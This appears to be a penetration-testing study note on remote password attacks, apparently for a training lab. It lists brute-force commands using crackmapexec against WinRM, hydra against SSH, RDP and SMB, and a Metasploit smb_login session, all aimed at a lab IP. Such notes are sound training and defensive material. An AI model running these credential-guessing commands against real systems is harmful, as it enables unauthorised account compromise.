# ☄️ Remote Password Attacks

{% content-ref url="../../../interacting-with-protocols-and-tools/tools/crackmapexec.md" %}
[crackmapexec.md](../../../interacting-with-protocols-and-tools/tools/crackmapexec.md)
{% endcontent-ref %}

```shell-session
crackmapexec winrm 10.129.42.197 -u user.list -p password.list
```

{% content-ref url="../../../interacting-with-protocols-and-tools/tools/winrm.md" %}
[winrm.md](../../../interacting-with-protocols-and-tools/tools/winrm.md)
{% endcontent-ref %}

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/ssh.md" %}
[ssh.md](../../../interacting-with-protocols-and-tools/protocols/ssh.md)
{% endcontent-ref %}

```shell-session
 hydra -L user.list -P password.list ssh://10.129.42.197
```

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/rdp.md" %}
[rdp.md](../../../interacting-with-protocols-and-tools/protocols/rdp.md)
{% endcontent-ref %}

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```

Connect through xfreerdp:

```shell-session
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

{% content-ref url="../../../interacting-with-protocols-and-tools/protocols/smb.md" %}
[smb.md](../../../interacting-with-protocols-and-tools/protocols/smb.md)
{% endcontent-ref %}

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```

we may also get the following error describing that the server has sent an invalid reply.

This is because we most likely have an outdated version of THC-Hydra that cannot handle SMBv3 replies. To work around this problem, we can manually update and recompile `hydra` or use another very powerful tool, the [Metasploit framework](https://www.metasploit.com/).

```shell-session
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run
```
